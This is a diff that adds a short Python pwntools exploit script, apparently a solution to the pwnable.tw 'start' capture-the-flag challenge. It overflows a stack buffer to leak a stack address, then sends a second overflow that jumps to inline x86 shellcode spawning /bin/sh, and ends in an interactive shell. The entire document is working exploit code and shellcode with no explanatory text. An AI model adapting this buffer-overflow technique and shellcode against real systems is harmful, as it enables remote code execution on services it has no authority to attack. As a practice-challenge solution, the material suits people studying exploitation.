@@ -1,0 +1,21 @@
+```python
+from pwn import *
+
+local = True
+local = False
+
+if local:
+    p = process("start")
+    gdb.attach(p)
+else:
+    p = remote("chall.pwnable.tw", 10000)
+
+context.log_level = 'debug'
+p.send(b"a" * 20 + p32(0x08048087))
+p.recvuntil(b"CTF:")
+leak_stack = u32(p.recv(4))
+print(hex(leak_stack))
+p.send(b"b" * 20 + p32(leak_stack + 20) +
+       b"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80")
+p.interactive()
+```
